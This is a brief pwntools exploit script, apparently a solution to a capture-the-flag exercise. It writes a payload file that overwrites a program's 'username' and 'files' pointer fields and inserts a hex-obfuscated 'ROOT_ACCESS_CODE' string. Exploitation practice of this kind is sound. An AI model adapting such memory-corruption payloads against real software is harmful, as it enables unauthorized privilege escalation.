from pwn import *

code = ''
code += unhex('4343415f544f4f52')[::-1]
code += unhex('45444f435f535345')[::-1]

payload = ''
payload += p64(0x0000000000602000) # username ptr
payload += code
payload += p64(0xdeadbeefdeadbeef) # files ptr

with open("input1.txt", "w") as f:
	f.write(payload)